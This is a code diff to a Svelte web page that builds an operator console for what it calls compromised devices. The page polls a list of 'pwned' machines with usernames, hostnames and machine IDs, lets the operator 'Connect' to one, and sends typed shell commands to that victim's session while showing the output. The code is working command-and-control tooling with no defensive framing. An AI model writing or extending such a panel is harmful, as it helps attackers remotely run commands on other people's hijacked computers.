@@ -1,17 +1,68 @@
 <script lang="ts">
   import { onMount } from 'svelte';
+  import { enhance } from '$app/forms';
   import SplitPane from '$lib/components/SplitPane.svelte';
 
+  let stdout: HTMLElement;
+  let inputEl: HTMLElement;
+
   let cmd = $state("");
+  let sid = $state("");
+  let idle_s = $state("");
+  let pwns = $state<{
+        id: number;
+        sid: string;
+        username: string;
+        hostname: string;
+        model: string;
+        machine_id: string;
+        pwned_at: Date;
+    }[]>([]);
 
-  async function sendCommand() {
-
-  }
+  function Interact(device: {
+        id: number;
+        sid: string;
+        username: string;
+        hostname: string;
+        model: string;
+        machine_id: string;
+        pwned_at: Date;
+    }) {
+        sid = device.sid;
+        idle_s = `${device.username}@${device.hostname} >$`;
+    }
 
   onMount(() => {
+    async function updateList() {
+      let res = await fetch('/api/devices', { credentials: "include" });
+      let json = await res.json();
+      pwns = json.devices;
+
+      res = await fetch('/api/session', { credentials: "include" });
+      json = await res.json();
+      stdout.textContent = json.output;
+    }
+
+    async function updateOutput() {
+      let res = await fetch('/api/devices', { credentials: "include" });
+      let json = await res.json();
+      pwns = json.devices;
+
+      res = await fetch('/api/session', { credentials: "include" });
+      json = await res.json();
+      stdout.textContent = json.output;
+    }
+
+    updateList();
+    updateOutput();
+    const t1 = setInterval(updateList, 1000);
+    const t2 = setInterval(updateOutput, 1000);
+
     document.body.classList.add('no-scroll');
     return () => {
-      document.body.classList.remove('no-scroll');
+        clearInterval(t1); // clean up on destroy
+        clearInterval(t2); // clean up on destroy
+        document.body.classList.remove('no-scroll');
     };
   });
 </script>
@@ -19,27 +70,60 @@
 <SplitPane>
   {#snippet topContent()}
     <div style="padding: 1rem;">
-      <h2>Top pane</h2>
-      <p>Content here.</p>
+      <h2>Compromised Devices</h2><hr>
+      <ul>
+        {#each pwns as d}
+            <li>
+                <strong>{d.username}@{d.hostname}</strong>
+                <small>({d.id})</small><br>
+
+                Device: {d.model}<br>
+
+                <small>
+                    Machine ID:
+                    <code>{d.machine_id}</code>
+                </small><br>
+                <button
+                    class="btn btn-primary"
+                    onclick={ () => { Interact(d) } }
+                >Connect</button>
+            </li>
+        {/each}
+      </ul>
     </div>
   {/snippet}
 
   {#snippet bottomContent()}
     <div class="terminal">
         <div class="stdout-area">
-            <p id="term-out" class="stdout">
+            <p id="term-out" bind:this={stdout} class="stdout">
             </p>
         </div>
-        <input
-            id="cmd"
-            class="stdin"
-            type="text"
-            bind:value={cmd}
-            onsubmit={sendCommand}
-            placeholder="Type a command..."
-            autocomplete="off"
-            spellcheck="false"
-        />
+        <form method="POST" action="?/send" use:enhance={() => {
+            return async ({ update }) => {
+                await update();
+                cmd = '';
+                inputEl.focus();
+            };
+        }}>
+            <input
+                id="cmd"
+                name="cmd"
+                class="stdin"
+                type="text"
+                bind:this={inputEl}
+                bind:value={cmd}
+                placeholder={idle_s}
+                autocomplete="off"
+                spellcheck="false"
+            />
+            <input
+                type="hidden"
+                id="sid"
+                name="sid"
+                bind:value={sid}
+            >
+        </form>
     </div>
   {/snippet}
 </SplitPane>
@@ -74,6 +158,7 @@
         border-radius: 4px;
         font-family: 'Courier New', monospace;
         font-size: 13px;
+        white-space: pre-wrap;
 
         height: 95%;
     }
@@ -101,5 +186,18 @@
 
     .stdin::placeholder {
         color: #ffffff;
+    }
+
+    li {
+        padding: 0.5rem 0;
+        border-bottom: 1px solid #444;
+    }
+
+    small {
+        color: #888;
+    }
+
+    code {
+        font-family: monospace;
     }
 </style>
